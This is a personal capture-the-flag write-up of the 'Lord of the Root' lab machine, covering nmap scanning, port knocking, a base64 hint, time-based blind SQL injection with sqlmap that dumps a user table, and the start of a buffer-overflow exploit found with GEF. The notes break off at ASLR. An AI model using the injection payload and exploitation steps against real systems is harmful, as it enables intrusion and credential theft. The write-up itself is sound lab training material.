---
title: Lord of the root
created: '2020-12-28T20:53:58.299Z'
modified: '2020-12-29T14:47:21.681Z'
---

# Lord of the root

## NMAP
```bash
root@kali:~# nmap -p 22 192.168.1.80
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 20:53 GMT
Nmap scan report for LordOfTheRoot.broadband (192.168.1.80)
Host is up (0.00051s latency).

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:62:AB:76 (VMware)

```

- ssh version 6.6 
> username enum
> then brute force
> python2 now depricated so can't really work
> check ssh banner

```bash
root@kali:~# ssh 192.168.1.80

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3

```

- easy as 1,2,3 - strange hint?
- Port knocking?
- 1,2,3 as port knocking password

## Port Knocking

```bash

root@kali:~# nmap -r -p 1,2,3 192.168.1.80
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 20:54 GMT
Nmap scan report for LordOfTheRoot.broadband (192.168.1.80)
Host is up (0.00043s latency).

PORT  STATE    SERVICE
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
MAC Address: 00:0C:29:62:AB:76 (VMware)

```


```bash

Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds
root@kali:~# nmap -p 1337 192.168.16.137
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 21:25 GMT
Nmap scan report for 192.168.16.137
Host is up (0.00040s latency).

PORT     STATE SERVICE
1337/tcp open  waste
MAC Address: 00:0C:29:62:AB:76 (VMware)

```

- reveals port 1337 open
- waste?
- further research shows its a web server
- robots.txt shows base64 string
> THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
> Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
> /978345210/index.php

- this new URL directory takes us to a login page
- Throw it into SQL map and dump database through time based blind injection
-

## Blind Time based SQL Injection

```typescript
root@kali:~# sqlmap -u http://192.168.16.137:1337//978345210/index.php --dump --forms
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:26:20 /2020-12-29/

[14:26:20] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=aaij4i7qr95...0lgefnffr5'). Do you want to use those [Y/n] 
[14:26:22] [INFO] searching for forms
[#1] form:
POST http://192.168.16.137:1337//978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] 
[14:26:25] [INFO] resuming back-end DBMS 'mysql' 
[14:26:25] [INFO] using '/root/.sqlmap/output/results-12292020_0226pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=ExQW&password=' AND (SELECT 3425 FROM (SELECT(SLEEP(5)))apKx) AND 'VqnW'='VqnW&submit= Login
---
do you want to exploit this SQL injection? [Y/n] 
[14:26:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:26:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:26:26] [INFO] fetching current database
[14:26:26] [INFO] resumed: Webapp
[14:26:26] [INFO] fetching tables for database: 'Webapp'
[14:26:26] [INFO] fetching number of tables for database 'Webapp'
[14:26:26] [INFO] resumed: 1
[14:26:26] [INFO] resumed: Users
[14:26:26] [INFO] fetching columns for table 'Users' in database 'Webapp'
[14:26:26] [INFO] resumed: 3
[14:26:26] [INFO] resumed: id
[14:26:26] [INFO] resumed: username
[14:26:26] [INFO] resumed: password
[14:26:26] [INFO] fetching entries for table 'Users' in database 'Webapp'
[14:26:26] [INFO] fetching number of entries for table 'Users' in database 'Webapp'
[14:26:26] [INFO] resumed: 5
[14:26:26] [INFO] resumed: 1
[14:26:26] [INFO] resumed: iwilltakethering
[14:26:26] [INFO] resumed: frodo
[14:26:26] [INFO] resumed: 2
[14:26:26] [INFO] resumed: MyPreciousR00t
[14:26:26] [INFO] resumed: smeagol
[14:26:26] [INFO] resumed: 3
[14:26:26] [INFO] resumed: AndMySword
[14:26:26] [INFO] resumed: aragorn
[14:26:26] [INFO] resumed: 4
[14:26:26] [INFO] resumed: AndMyBow
[14:26:26] [INFO] resumed: legolas
[14:26:26] [INFO] resumed: 5
[14:26:26] [INFO] resumed: AndMyAxe
[14:26:26] [INFO] resumed: gimli
Database: Webapp
Table: Users
[5 entries]
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | iwilltakethering | frodo    |
| 2  | MyPreciousR00t   | smeagol  |
| 3  | AndMySword       | aragorn  |
| 4  | AndMyBow         | legolas  |
| 5  | AndMyAxe         | gimli    |
+----+------------------+----------+

[14:26:26] [INFO] table 'Webapp.Users' dumped to CSV file '/root/.sqlmap/output/192.168.16.137/dump/Webapp/Users.csv'
[14:26:26] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-12292020_0226pm.csv'

```


## Buffer Overflow

```typescript 
gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Starting program: /root/Documents/lordOfTheRoot/fileNew aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x61617362 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0xffffda50  →  "bxaabyaab"
$edx   : 0xffffd750  →  "bxaabyaab"
$esp   : 0xffffd740  →  "btaabuaabvaabwaabxaabyaab"
$ebp   : 0x61617262 ("braa"?)
$esi   : 0xf7fb2000  →  0x001dfd6c
$edi   : 0xf7fb2000  →  0x001dfd6c
$eip   : 0x61617362 ("bsaa"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd740│+0x0000: "btaabuaabvaabwaabxaabyaab"	 ← $esp
0xffffd744│+0x0004: "buaabvaabwaabxaabyaab"
0xffffd748│+0x0008: "bvaabwaabxaabyaab"
0xffffd74c│+0x000c: "bwaabxaabyaab"
0xffffd750│+0x0010: "bxaabyaab"
0xffffd754│+0x0014: "byaab"
0xffffd758│+0x0018: 0xf7fb0062  →  0x100e4103
0xffffd75c│+0x001c: 0x00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61617362
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fileNew", stopped 0x61617362 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search eip
[+] Searching 'eip'
[!] Pattern 'eip' not found
gef➤  pattern search $eip
[+] Searching '$eip'
[+] Found at offset 171 (little-endian search) likely
gef➤  pattern search 0xffffd740
[+] Searching '0xffffd740'
[+] Found at offset 175 (little-endian search) likely
gef➤  pattern search bsaa
[+] Searching 'bsaa'
[+] Found at offset 171 (big-endian search) 
gef➤  pattern search btaabuaabvaabwaabxaabyaab
[+] Searching 'btaabuaabvaabwaabxaabyaab'
[+] Found at offset 175 (big-endian search) 


```

- We have overflowed the program using GEF
- From the seg fault we can see the program overlows at 171 (170 it runs normally)
- So we need to fuzz the stack up to ESP (top of stack) and use a series of nop sleds to get to the EIP
- Once we have reached the EIP we can dump malicious payload which will execute shell with elevated priviledges

# ASLR Bypass
- This program has ASLR enabled
> ASLR randomizes the address of the EIP everytime the program is ran. If we try to overwrite the EIP with the address of our payload then it will not work as the address of the EIP will be different each time.




